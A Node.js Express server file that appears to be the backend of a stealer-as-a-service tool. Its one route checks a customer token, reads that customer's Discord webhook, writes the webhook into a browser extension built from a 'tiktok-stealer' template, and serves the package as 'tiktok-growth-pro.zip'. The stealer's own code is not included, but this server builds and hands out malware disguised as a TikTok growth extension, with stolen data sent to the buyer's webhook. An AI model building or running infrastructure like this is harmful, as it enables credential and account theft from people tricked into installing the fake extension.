import express from 'express';
import cors from 'cors';
import crypto from 'crypto';
import { createClient } from '@supabase/supabase-js';
import JSZip from 'jszip';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({
  origin: 'https://elitetools.lovable.app',
  methods: ['GET', 'POST', 'PUT', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

app.get('/', (req, res) => {
  res.send('Extension Backend Running ✅');
});

app.get('/api/generate-extension', async (req, res) => {
  const { token } = req.query;

  if (!token || !token.startsWith('elit_')) {
    return res.status(401).send('Invalid or missing token');
  }

  try {
    const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

    // Single secure RPC: verifies token AND returns webhook
    const { data, error } = await supabase.rpc('get_discord_webhook_for_token', {
      _token_hash: tokenHash
    });

    if (error) {
      console.error('RPC error:', error);
      return res.status(500).send('Error verifying token: ' + error.message);
    }

    if (!data || !data.length) {
      return res.status(401).send('Invalid token. Please verify your Discord account first.');
    }

    const webhook = data[0].discord_webhook;

    if (!webhook) {
      return res.status(400).send('No webhook configured. Please set your webhook in Settings → Webhook Configuration.');
    }

    // Read template files
    const templatePath = path.join(__dirname, 'templates', 'tiktok-stealer');

    const manifest = fs.readFileSync(path.join(templatePath, 'manifest.json'), 'utf8');
    const background = fs.readFileSync(path.join(templatePath, 'background.js'), 'utf8');
    const popup_html = fs.readFileSync(path.join(templatePath, 'popup.html'), 'utf8');
    const popup_js = fs.readFileSync(path.join(templatePath, 'popup.js'), 'utf8');

    const customBackground = background.replace('WEBHOOK_PLACEHOLDER_12345', webhook);

    const zip = new JSZip();
    zip.file('manifest.json', manifest);
    zip.file('background.js', customBackground);
    zip.file('popup.html', popup_html);
    zip.file('popup.js', popup_js);

    const iconPath = path.join(templatePath, 'icon128.png');
    if (fs.existsSync(iconPath)) {
      zip.file('icon16.png', fs.readFileSync(path.join(templatePath, 'icon16.png')));
      zip.file('icon48.png', fs.readFileSync(path.join(templatePath, 'icon48.png')));
      zip.file('icon128.png', fs.readFileSync(iconPath));
    }

    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="tiktok-growth-pro.zip"');
    res.send(zipBuffer);
  } catch (error) {
    console.error('Generate extension error:', error);
    res.status(500).send('Error generating extension: ' + error.message);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
